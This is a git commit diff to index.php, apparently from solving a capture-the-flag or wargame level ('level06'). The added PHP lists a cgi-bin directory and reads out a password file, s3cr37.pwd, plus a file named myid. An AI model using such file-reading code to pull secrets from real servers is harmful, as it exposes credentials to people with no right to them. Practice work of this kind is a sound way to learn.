45fe77ea180af26ecac194bed230901c3e463e46
morita657 <morita657@gmail.com>
2022-04-24 20:21:06 +0900

    update

--- index.php
+++ index.php
@@ -1,3 +1,5 @@
 print("Hello World");
 print_r(glob("/var/www/challenges/level06/public_html/cgi-bin/*"));
 print_r(glob("/var/www/challenges/level06/public_html/cgi-bin/*"));
+print(readfile("/var/www/challenges/level06/public_html/cgi-bin/s3cr37.pwd"));
+print(readfile("/var/www/challenges/level06/public_html/cgi-bin/myid"));
